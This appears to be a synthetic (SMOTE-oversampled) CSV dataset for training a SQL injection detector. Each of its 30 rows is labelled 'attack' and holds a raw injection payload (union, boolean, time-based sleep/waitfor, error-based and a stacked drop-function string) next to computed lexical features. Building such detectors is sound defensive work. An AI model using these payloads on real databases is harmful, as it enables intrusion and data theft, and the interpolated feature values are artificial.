id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001540,attack,other,"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",nearest_attack_euclidean,R007640,0.03437761771906924,285.2187398758494,38.01286705152055,3.928142358415964,107.16727166976717,34.0,106.03860115456166,38.01286705152055,0.3757205444309023,0.1192118373907415,0.37178825261078235,0.13327936556757383,1.0,0.0,0.0,0.0,0.0,1.0,0.0,23.0,0.0,3.0,3.0,7.0,1.0,0.0,0.0,0.012867051520552064,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,10.0
SMOTE_001541,attack,boolean,-2960' or 2163  =  3143--,nearest_attack_euclidean,R002649,1.1920928955078125e-07,25.0,13.0,3.40307418942857,2.0,12.0,6.0,5.0,0.08000000000000002,0.48,0.24,0.2,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001542,attack,time,"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R007194,0.2680798641572683,98.78420399456668,24.65262971273334,2.9453624453236724,29.652629712733336,2.0,52.30525942546667,14.826314856366668,0.30018675821896057,0.020261461506544787,0.5294584011650144,0.15009337910948028,0.0,1.0,0.0,0.0,1.0,0.0,0.0,10.826314856366668,0.9999999999999999,0.0,0.0,0.9999999999999996,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,0.0,1.0,0.17368514363333082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.173685143633331
SMOTE_001543,attack,other,if  (  3831  =  9321  )   select 3831 else drop function ybru--,nearest_attack_euclidean,R001049,0.0014576677756320668,63.0,25.0,4.018850492854784,28.0,12.0,18.0,5.0,0.4444444444444444,0.19047619047619047,0.2857142857142857,0.07936507936507936,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001544,attack,union,"-1802%'   )    )    union all select 1002,1002,1002,1002,1002,1002,1002#",nearest_attack_euclidean,R007670,0.15009841350705178,72.95338403033384,21.381353612133537,3.628270273620772,14.0,32.762707224267075,14.0,12.190676806066769,0.19203690901430848,0.44884679494526447,0.19203690901430848,0.16707938702611855,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.9999999999999991,0.9999999999999999,0.0,6.190676806066769,0.9999999999999996,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001545,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""mjkl""  =  ""mjkl",nearest_attack_euclidean,R006722,0.04950817753370848,161.40414067989911,34.07348012361802,4.008811941412597,64.14696024723604,15.0,59.22044037085406,23.03674006180901,0.3974359235985649,0.0929487898960535,0.3668802036542488,0.14273508285113284,4.0,4.0,0.0,0.0,0.0,1.9632599381909903,0.0,8.073480123618019,0.0,0.0,0.0,5.9632599381909905,1.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_001546,attack,union," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",nearest_attack_euclidean,R000172,0.11275538953465983,77.8546125728952,27.0,3.928214952613919,41.483690058316164,3.0,23.37092251457904,10.0,0.5325821867310299,0.038569876913793766,0.30028167997586375,0.12856625637931252,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.9999999999999991,0.0,0.0,1.0,5.370922514579041,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001547,attack,union,"-5425 where 5933  =  5933 union all select 5933,5933,5933--",nearest_attack_euclidean,R008658,0.10796885710225682,59.901620307012216,22.090162030701222,3.8573937105173624,19.0,24.721296245609768,10.0,6.180324061402443,0.31782589392453153,0.4119178558395194,0.16727678627606923,0.10297946395987984,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.180324061402442,4.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001548,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R006712,0.08578641335325503,60.82336863571397,20.164673727142794,3.6226608518711076,14.0,24.0,14.658694908571178,8.164673727142794,0.2303776510512832,0.39493311608791404,0.24051141887545513,0.13417781398534767,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.1646737271427936,0.0,0.0,4.0,0.9999999999999996,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001549,attack,boolean,"1'||  (  select 'qsgi' where 1707  =  1707 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",nearest_attack_euclidean,R001237,0.235158162830457,170.20898916802906,36.0,4.289706606930283,82.03857701468363,16.43408243066909,48.86816486133818,22.86816486133818,0.48186458014547173,0.09656838809696745,0.28725272117977757,0.13431431057778326,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,0.0,2.4340824306690894,7.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001550,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R006210,0.3438272302964484,125.81669530700323,27.816695307003233,3.9565915960843387,62.0,10.0,34.0,19.816695307003233,0.492785072442273,0.07948146329714081,0.27023697521027873,0.15749648905030747,1.0,0.0,2.0,0.0,1.0,1.0,0.0,5.0,0.8166953070032323,5.0,4.0,4.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001551,attack,union,"-3037  )   where 9024  =  9024 union all select 9024,9024--",nearest_attack_euclidean,R002495,0.25295869881916794,62.59306258139284,24.449132822674105,4.004753234809348,21.694796936044632,20.0,14.89826564534821,6.0,0.34498477869470506,0.3208041356873623,0.2379698449117239,0.0962412407062087,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001552,attack,other,1'||  (  select 'yezk' where 2097  =  2097,nearest_attack_euclidean,R006958,0.0009826286879700123,42.0,21.0,3.858999684007632,15.0,9.0,11.0,7.0,0.35714285714285715,0.21428571428571427,0.2619047619047619,0.16666666666666666,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001553,attack,boolean,1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,nearest_attack_euclidean,R004266,0.033829156803698336,71.0,29.729117468156687,4.198211976774416,26.0,17.0,18.999999999999996,9.0,0.36619718309859156,0.23943661971830985,0.2676056338028169,0.1267605633802817,3.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001554,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R002368,0.16398985996797585,85.88260320537623,21.856278668160062,2.897676952974619,7.313767200896038,15.08502293452805,46.170045869056096,17.313767200896038,0.08444108370951137,0.17523617481813347,0.5384165392526219,0.20190620221973324,4.0,0.0,1.0,0.0,0.0,2.0,0.0,7.542511467264025,2.0,0.0,0.7712557336320125,3.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001555,attack,boolean,"-5959"" or 2477  =  1144",nearest_attack_euclidean,R004642,0.056310570830772184,23.0,12.0,3.2688339021854165,2.0,12.0,6.0,3.0,0.08695652173913043,0.5217391304347826,0.2608695652173913,0.13043478260869565,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001556,attack,boolean,end and 'aenf'  =  'aenf,nearest_attack_euclidean,R006420,0.04363235982797549,24.0,8.156213962831387,2.8622922666815844,14.0,0.0,6.0,4.0,0.5833333333333334,0.0,0.25,0.16666666666666666,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001557,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R007332,0.12586947401476578,72.88228843474909,20.223542313050185,3.633126178735266,14.0,39.10583074779927,8.0,11.776457686949817,0.19225381157726457,0.5363376298368944,0.10985932090129402,0.1615492376845471,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.776457686949816,0.9999999999999996,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001558,attack,boolean,"1%"" and make_set  (  2905  =  5725,5725  )   and ""%""  =  """,nearest_attack_euclidean,R008537,0.0871667608770644,58.94984633621458,21.905015366378542,3.6367541514798933,13.0,13.0,20.759877068971665,12.189969267242915,0.22100709879036776,0.22100709879036776,0.3511855839949455,0.206800218424319,0.0,4.0,0.0,0.0,0.0,2.0,0.0,2.1899692672429163,2.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001559,attack,other,1' where 4460  =  4460,nearest_attack_euclidean,R001515,0.0,21.999999999999986,11.0,3.1180782093497093,5.0,9.0,6.0,2.0,0.22727272727272727,0.4090909090909091,0.2727272727272727,0.09090909090909091,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001560,attack,error,"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R005484,0.044683540509464284,150.42283715096616,34.0,3.855763494813456,50.0,23.0,57.64233647726626,19.780500673699912,0.33317329785913485,0.15325971701520202,0.38217278424778134,0.13139420087788176,0.0,1.0,0.0,0.0,0.0,0.0,0.0,12.780500673699912,0.9999999999999999,0.0,4.0,0.0,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001561,attack,error,"-4032""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""olox""  =  ""olox",nearest_attack_euclidean,R006997,0.20538850996844307,376.2494389094768,32.01797737654069,3.321651586881771,85.0,48.0,177.92809049383726,65.32134841563953,0.2259849506368189,0.12761503094785065,0.4727785377404022,0.17362148067492827,0.0,4.0,1.0,0.0,0.0,3.0,0.0,35.32134841563954,0.0,0.0,0.0,24.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001562,attack,error,1'   )    )    as plbt where 4368  =  4368 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R000798,0.4380857198726892,437.79318971620756,34.58637943241509,3.500103440878182,112.0,59.0,195.0,71.79318971620754,0.2558287762754812,0.13476694464511957,0.44541617297963243,0.16398810609976677,0.793189716207545,0.0,2.0,0.0,0.0,3.0,0.0,40.0,0.0,0.0,0.0,31.0,0.793189716207545,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_001563,attack,time,"1""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""fvrq""  =  ""fvrq",nearest_attack_euclidean,R007152,0.22854861382469252,80.89700652540246,24.245109661021676,3.3728009087336055,21.490219322043348,10.0,36.774451694891624,12.632335508467488,0.2666824001627302,0.12379384142097818,0.453628264453027,0.1558954939632646,0.0,4.0,0.0,0.0,0.0,1.877445169489162,0.0,5.754890338978324,0.0,0.0,1.0,1.877445169489162,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001564,attack,time,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,nearest_attack_euclidean,R002069,0.18361660347115066,52.30923597177379,24.0,4.06801089314927,18.731926978830334,12.0,13.577308992943443,8.0,0.35632390945564224,0.23044454080645332,0.25960185586693557,0.1536296938709689,2.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001565,attack,other,"select * from generate_series  (  7494,7494,case when   (  7494  =  7854  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R004182,0.0014946565202781253,110.0,31.0,4.051259937926889,48.0,19.0,32.0,11.0,0.43636363636363634,0.17272727272727273,0.2909090909090909,0.1,0.0,0.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,1.0,2.0,4.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_001566,attack,error,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'tnfm' like 'tnfm",nearest_attack_euclidean,R008163,0.1701065180259569,217.78847837299224,31.2709271066767,3.5020722660614036,59.0,32.0,97.41404101305241,29.374437359939805,0.27231699290117684,0.14769735208199425,0.4453264495400405,0.1346592054767884,4.0,0.0,0.0,0.0,1.0,1.0,0.0,18.374437359939805,0.0,0.0,4.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001567,attack,other,"1   )    )    as bebl where 2597  =  2597   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",nearest_attack_euclidean,R004473,1.1009354480517302,319.22587567639613,39.46235405393397,3.9870102307774564,118.0,42.0,118.22587567639616,41.0,0.3696767303854986,0.13157985318805882,0.3702964168857185,0.12844699954072408,0.0,0.46235405393397105,2.0,0.0,0.0,2.0,0.0,23.53764594606603,0.0,3.0,3.0,10.0,0.0,0.4623540539339711,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,10.999999999999998
SMOTE_001568,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R007874,0.12555439106727107,62.30548148210452,16.0,3.2032887683777465,43.04438518568361,1.0,8.0,10.261096296420902,0.6907295762737979,0.016069179959735586,0.12855343967788474,0.16464780408858168,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.261096296420902,2.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001569,attack,boolean,"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R002321,0.0036244468939582676,126.02341260160236,31.009365040640944,4.06699477886753,72.0,8.00468252032047,31.009365040640944,15.009365040640942,0.5713264444859221,0.0635164604839186,0.24605926356907099,0.11909783146108828,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.9999999999999999,0.0,2.004682520320471,4.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
